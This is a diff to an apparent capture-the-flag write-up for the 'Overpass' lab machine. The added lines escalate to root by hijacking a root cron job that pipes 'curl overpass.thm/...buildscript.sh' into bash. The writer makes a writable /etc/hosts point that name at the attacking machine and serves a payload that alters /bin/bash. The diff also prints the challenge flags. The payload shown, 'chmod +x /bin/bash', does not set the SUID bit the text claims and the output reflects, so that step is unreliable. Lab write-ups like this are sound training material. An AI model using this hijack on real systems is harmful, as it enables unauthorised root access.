@@ -8,6 +8,7 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 
 1. Escalate your privileges and get the flag in root.txt
 ```
+thm{7f336f8c359dbac18d54fdd64ea753bb}
 ```
 
 Starting off with basic port scan, 
@@ -159,3 +160,32 @@ thm{65c1aaf000506e56996822c6281e6bf7}
 ```
 We got the first flag!
 
+Running linpeas.sh shows intersing cronjob,
+```
+* * * * *  root curl overpass.thm/downloads/src/buildscript.sh | bash
+```
+And **/etc/hosts** file is writable!
+Replacing overpass.thm IP to our attacking machine IP and creating file and directories as specified.
+```
+downloads/src/buildscript.sh
+```
+Content of buildscript.sh,
+```
+#! /bin/bash
+
+chmod +x /bin/bash
+```
+I chose to add SUID bit to /bin/bash directly to get root shell in the current session rather than spawning another nc reverse shell.
+
+```
+james@overpass-prod:~$ /bin/bash -p
+bash-4.4# id
+uid=1001(james) gid=1001(james) euid=0(root) egid=0(root) groups=0(root),1001(james)
+bash-4.4# whoami
+root
+```
+We get the root flag!
+```
+bash-4.4# cat root.txt
+thm{7f336f8c359dbac18d54fdd64ea753bb}
+```
